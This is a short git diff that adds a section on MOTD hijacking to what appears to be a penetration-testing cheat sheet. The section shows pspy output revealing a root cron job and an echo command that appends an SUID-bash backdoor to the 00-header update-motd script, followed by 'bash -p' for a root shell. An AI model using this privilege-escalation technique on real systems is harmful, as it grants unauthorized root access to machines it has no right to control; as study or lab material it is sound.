@@ -1298,3 +1298,21 @@ requirements:
   - !ruby/object:Gem::Source::SpecificFile
       spec:
 ```
+
+### MOTD Hijacking&#x20;
+
+* Detection:
+* Can see root processes like cron jobs without root permissions with `pspy`&#x20;
+
+```
+2023/04/06 18:00:01 CMD: UID=0     PID=1087   | /bin/cp /var/backups/.update-motd.d/00-header 
+2023/04/06 18:00:01 CMD: UID=0     PID=1083   | /usr/sbin/CRON -f
+```
+
+* look for the `motd` to be owned by root but set to a group that we are in, can echo:
+
+```
+echo "cp /bin/bash /home/sysadmin/bash && chmod u+s /home/sysadmin/bash" >> 00-header
+```
+
+* now log out and re-ssh in to kick it off and then execute bash with `bash -p`
